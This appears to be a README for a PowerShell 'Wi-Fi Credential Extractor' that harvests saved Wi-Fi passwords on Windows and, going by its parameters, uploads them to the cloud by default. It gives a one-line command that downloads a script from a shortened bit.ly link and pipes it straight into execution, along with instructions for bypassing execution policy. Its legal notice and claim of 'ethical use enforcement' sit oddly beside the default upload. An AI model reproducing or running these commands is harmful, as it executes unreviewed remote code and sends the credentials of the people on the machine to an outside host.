
# # 🔐 **Wi-Fi Credential Extractor** — PowerShell Tool for Windows

![PowerShell](https://img.shields.io/badge/PowerShell-v5.1+-blue.svg)
![License](https://img.shields.io/badge/License-MIT-green.svg)
![Maintainer](https://img.shields.io/badge/Maintainer-techiecyber404-blue)

> **⚠️ Legal Notice**: Only use on networks you own or have explicit permission to test.  
> Unauthorized access to computer networks is illegal.

## 📥 Installation
```powershell
# Download directly
irm https://raw.githubusercontent.com/techiecyber404/WiFi-Credential-Extractor/main/Get-WiFiCredentials.ps1 -OutFile WiFiExtractor.ps1
```

## 🚀 Basic Usage
```powershell
# Run with default options (admin PowerShell required)
.\WiFiExtractor.ps1 
```

## ⚙️ Parameters
| Parameter       | Description                          |
|-----------------|--------------------------------------|
| `-LocalOnly`    | Disables cloud upload                |
| `-ShowPasswords`| Displays passwords in console        |
| `-OutputPath`   | Custom save location (default: TEMP) |

## 🛡️ Execution Bypass
If blocked by policies:
```powershell
# Method 1: Temporary bypass
Set-ExecutionPolicy Bypass -Scope Process -Force

# Method 2: Direct execution (no save)
irm https://bit.ly/wifi-extractor | iex
```

## 🌟 Features
- Encrypted credential storage
- Ethical use enforcement
- Lightweight (7KB) and fast

## 📜 License
MIT © [Venkatesh K](https://github.com/techiecyber404)  
**GitHub**: [@techiecyber404](https://github.com/techiecyber404)
